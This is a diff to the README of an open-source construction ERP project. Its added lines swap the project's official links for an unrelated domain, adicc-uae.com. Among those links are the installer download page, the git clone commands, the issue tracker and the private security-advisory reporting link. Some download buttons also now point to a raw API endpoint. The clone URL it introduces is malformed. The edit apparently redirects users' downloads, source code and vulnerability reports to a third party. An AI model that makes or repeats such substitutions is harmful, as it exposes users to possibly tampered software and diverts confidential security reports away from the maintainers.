@@ -10,25 +10,25 @@ Professional BOQ, CAD and BIM takeoff, 4D scheduling, 5D cost model, and tenderi
 
 **A platform companies build any construction app on.** Use OpenConstructionERP as the base to assemble the exact software a project needs and to build your own modules on top, from estimating and BIM to scheduling and site delivery. One open, powerful foundation for anything you run in construction.
 
-[▶ Watch the 12-min walkthrough](https://www.youtube.com/watch?v=X06cIaroAeI) · [Demo](https://openconstructionerp.com) · [Documentation](https://openconstructionerp.com/docs) · [Discussions](https://t.me/datadrivenconstruction) · [Report Bug](https://github.com/datadrivenconstruction/OpenConstructionERP/issues)
+[▶ Watch the 12-min walkthrough](https://www.youtube.com/watch?v=X06cIaroAeI) · [Demo](https://adicc-uae.com) · [Documentation](https://adicc-uae.com/docs) · [Discussions](https://t.me/datadrivenconstruction) · [Report Bug](https://adicc-uae.com/issues)
 
 [![License](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE)
-[![Version](https://img.shields.io/github/v/release/datadrivenconstruction/OpenConstructionERP?label=version&color=green&v=10.10.0)](https://github.com/datadrivenconstruction/OpenConstructionERP/releases/latest)
+[![Version](https://img.shields.io/github/v/release/datadrivenconstruction/OpenConstructionERP?label=version&color=green&v=10.10.0)](https://api.github.com/repos/datadrivenconstruction/OpenConstructionERP/releases/latest)
 [![PyPI](https://img.shields.io/pypi/v/openconstructionerp?color=informational&label=pypi&v=10.10.0)](https://pypi.org/project/openconstructionerp/)
 [![Downloads (pepy · per month)](https://static.pepy.tech/personalized-badge/openconstructionerp?period=month&units=international_system&left_color=grey&right_color=blue&left_text=downloads%20(pepy%20%C2%B7%20per%20month))](https://pepy.tech/project/openconstructionerp)
-[![Stars](https://img.shields.io/github/stars/datadrivenconstruction/OpenConstructionERP?style=flat&logo=github)](https://github.com/datadrivenconstruction/OpenConstructionERP/stargazers)
-[![Last commit](https://img.shields.io/github/last-commit/datadrivenconstruction/OpenConstructionERP?color=informational)](https://github.com/datadrivenconstruction/OpenConstructionERP/commits/main)
+[![Stars](https://img.shields.io/github/stars/datadrivenconstruction/OpenConstructionERP?style=flat&logo=github)](https://adicc-uae.com/stargazers)
+[![Last commit](https://img.shields.io/github/last-commit/datadrivenconstruction/OpenConstructionERP?color=informational)](https://adicc-uae.com/commits/main)
 <br/>
 ![Languages](https://img.shields.io/badge/languages-27-orange)
 ![Cost Items](https://img.shields.io/badge/cost_items-55%2C000%2B-red)
-[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/datadrivenconstruction/OpenConstructionERP/badge)](https://securityscorecards.dev/viewer/?uri=github.com/datadrivenconstruction/OpenConstructionERP)
-[![CodeQL](https://github.com/datadrivenconstruction/OpenConstructionERP/actions/workflows/codeql.yml/badge.svg)](https://github.com/datadrivenconstruction/OpenConstructionERP/actions/workflows/codeql.yml)
+[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/adicc-uae.com/badge)](https://securityscorecards.dev/viewer/?uri=adicc-uae.com)
+[![CodeQL](https://adicc-uae.com/actions/workflows/codeql.yml/badge.svg)](https://adicc-uae.com/actions/workflows/codeql.yml)
 [![Signed releases](https://img.shields.io/badge/releases-Sigstore_signed-8250df)](SECURITY.md)
 
 <img src="docs/screenshots/hero-overview.png" alt="OpenConstructionERP - open-source construction ERP for BOQ, BIM takeoff, DWG/PDF quantification and 5D cost modeling" width="800" />
 
 <video src="https://github.com/user-attachments/assets/20b9b585-93ac-4829-a3dc-0ede9ca9e2fc" controls width="800" playsinline>
-  <a href="https://github.com/datadrivenconstruction/OpenConstructionERP/releases/download/v2.0.0/oce_full_demo.mp4">▶ 1-minute teaser (your browser can't inline this - click for full 12-min walkthrough)</a>
+  <a href="https://adicc-uae.com/releases/download/v2.0.0/oce_full_demo.mp4">▶ 1-minute teaser (your browser can't inline this - click for full 12-min walkthrough)</a>
 </video>
 
 <sub><picture><source media="(prefers-color-scheme: dark)" srcset="docs/readme-icons/device-camera-video-dark.svg"><img src="docs/readme-icons/device-camera-video-light.svg" width="14" align="center" alt=""></picture> <b>1-minute teaser above</b> · for the full 12-minute walkthrough → <a href="https://www.youtube.com/watch?v=X06cIaroAeI"><b>watch on YouTube</b></a> · onboarding → BoQ → BIM → DWG → PDF → AI → dashboard</sub>
@@ -39,13 +39,13 @@ Professional BOQ, CAD and BIM takeoff, 4D scheduling, 5D cost model, and tenderi
 
 <sub>No Python, no Docker, nothing to set up. Pick your system and run it.</sub>
 
-<a href="https://github.com/datadrivenconstruction/OpenConstructionERP/releases/latest"><img src="https://img.shields.io/badge/Windows-Download%20.exe-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Download OpenConstructionERP for Windows" height="46"></a>
+<a href="https://api.github.com/repos/datadrivenconstruction/OpenConstructionERP/releases/latest"><img src="https://img.shields.io/badge/Windows-Download%20.exe-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Download OpenConstructionERP for Windows" height="46"></a>
 &nbsp;&nbsp;
-<a href="https://github.com/datadrivenconstruction/OpenConstructionERP/releases/latest"><img src="https://img.shields.io/badge/macOS-Download%20.dmg-111111?style=for-the-badge&logo=apple&logoColor=white" alt="Download OpenConstructionERP for macOS" height="46"></a>
+<a href="https://api.github.com/repos/datadrivenconstruction/OpenConstructionERP/releases/latest"><img src="https://img.shields.io/badge/macOS-Download%20.dmg-111111?style=for-the-badge&logo=apple&logoColor=white" alt="Download OpenConstructionERP for macOS" height="46"></a>
 &nbsp;&nbsp;
-<a href="https://github.com/datadrivenconstruction/OpenConstructionERP/releases/latest"><img src="https://img.shields.io/badge/Linux-.deb%20%2F%20.AppImage-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Download OpenConstructionERP for Linux" height="46"></a>
+<a href="https://api.github.com/repos/datadrivenconstruction/OpenConstructionERP/releases/latest"><img src="https://img.shields.io/badge/Linux-.deb%20%2F%20.AppImage-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Download OpenConstructionERP for Linux" height="46"></a>
 
-<sub>Not sure which file? <a href="https://openconstructionerp.com/download"><b>openconstructionerp.com/download</b></a> picks the right one for you automatically. Prefer the terminal? <code>pip install openconstructionerp</code> or Docker, see <a href="#quick-start">Quick Start</a> below.</sub>
+<sub>Not sure which file? <a href="https://adicc-uae.com/download"><b>adicc-uae.com/download</b></a> picks the right one for you automatically. Prefer the terminal? <code>pip install openconstructionerp</code> or Docker, see <a href="#quick-start">Quick Start</a> below.</sub>
 
 <br/>
 
@@ -749,8 +749,8 @@ Get productive in under 10 minutes:
 
 Download the installer for your operating system, run it, and OpenConstructionERP opens as a native desktop app. No Python, no pip, no Docker, and no database to set up. Everything runs locally on your machine.
 
-- **[Download for your platform](https://openconstructionerp.com/download)** picks the right file for your OS automatically.
-- Or grab one straight from the **[latest release](https://github.com/datadrivenconstruction/OpenConstructionERP/releases/latest)**: Windows `.exe` installer, macOS `.dmg`, or Linux `.deb` / `.AppImage`.
+- **[Download for your platform](https://adicc-uae.com/download)** picks the right file for your OS automatically.
+- Or grab one straight from the **[latest release](https://api.github.com/repos/datadrivenconstruction/OpenConstructionERP/releases/latest)**: Windows `.exe` installer, macOS `.dmg`, or Linux `.deb` / `.AppImage`.
 
 The first launch takes about a minute while it sets up your local database, then every launch after that is fast. Open source under AGPL-3.0.
 
@@ -860,7 +860,7 @@ docker run -d -p 8080:8080 -v oe_data:/data ghcr.io/datadrivenconstruction/openc
 Or build from source:
 
 ```bash
-git clone https://github.com/datadrivenconstruction/OpenConstructionERP.git
+git clone https://adicc-uae.com.git
 cd OpenConstructionERP
 make quickstart
 ```
@@ -870,7 +870,7 @@ Open **http://localhost:8080**. The published image starts in seconds; a from-so
 ### Alternative 3: Local development (clone + npm + uvicorn)
 
 ```bash
-git clone https://github.com/datadrivenconstruction/OpenConstructionERP.git
+git clone https://adicc-uae.com.git
 cd OpenConstructionERP
 
 # Install dependencies
@@ -1039,9 +1039,9 @@ flowchart TB
 
 OpenConstructionERP is built and maintained by the community. If you find it useful:
 
-- ⭐ **[Star this repo](https://github.com/datadrivenconstruction/OpenConstructionERP)** - helps others discover the project
+- ⭐ **[Star this repo](https://adicc-uae.com)** - helps others discover the project
 - <picture><source media="(prefers-color-scheme: dark)" srcset="docs/readme-icons/comment-discussion-dark.svg"><img src="docs/readme-icons/comment-discussion-light.svg" width="14" align="center" alt=""></picture> **[Join Discussions](https://t.me/datadrivenconstruction)** - ask questions, share ideas, help others
-- <picture><source media="(prefers-color-scheme: dark)" srcset="docs/readme-icons/bug-dark.svg"><img src="docs/readme-icons/bug-light.svg" width="14" align="center" alt=""></picture> **[Report issues](https://github.com/datadrivenconstruction/OpenConstructionERP/issues)** - help us improve
+- <picture><source media="(prefers-color-scheme: dark)" srcset="docs/readme-icons/bug-dark.svg"><img src="docs/readme-icons/bug-light.svg" width="14" align="center" alt=""></picture> **[Report issues](https://adicc-uae.com/issues)** - help us improve
 - <picture><source media="(prefers-color-scheme: dark)" srcset="docs/readme-icons/briefcase-dark.svg"><img src="docs/readme-icons/briefcase-light.svg" width="14" align="center" alt=""></picture> **[Professional consulting](https://datadrivenconstruction.io/contact-support/)** - custom deployment, training, enterprise support
 
 ## Contributors
@@ -1050,7 +1050,7 @@ OpenConstructionERP is shaped by the people who report bugs, request features, a
 
 For security reasons we do not merge external pull requests. When someone reports a bug or sends a patch, we re-implement the fix ourselves in our own sandbox and review it before it ships. That keeps one audited source of truth for a codebase that companies run in production, and it avoids pulling in code we did not write. The credit goes to the person who reported the problem or proposed the idea, and the implementation is our own.
 
-See **[CONTRIBUTORS.md](CONTRIBUTORS.md)** for the full list. Want to join it? [Open an issue](https://github.com/datadrivenconstruction/OpenConstructionERP/issues) or say hello in the [community chat](https://t.me/datadrivenconstruction).
+See **[CONTRIBUTORS.md](CONTRIBUTORS.md)** for the full list. Want to join it? [Open an issue](https://adicc-uae.com/issues) or say hello in the [community chat](https://t.me/datadrivenconstruction).
 
 ## Security
 
@@ -1063,7 +1063,7 @@ OpenConstructionERP includes security hardening for production deployments:
 
 **Do not open public GitHub issues for security vulnerabilities.**
 Report privately via
-[GitHub Security Advisories](https://github.com/datadrivenconstruction/OpenConstructionERP/security/advisories/new)
+[GitHub Security Advisories](https://adicc-uae.com/security/advisories/new)
 or by email to
 [info@datadrivenconstruction.io](mailto:info@datadrivenconstruction.io).
 See [SECURITY.md](SECURITY.md) for the full coordinated-disclosure
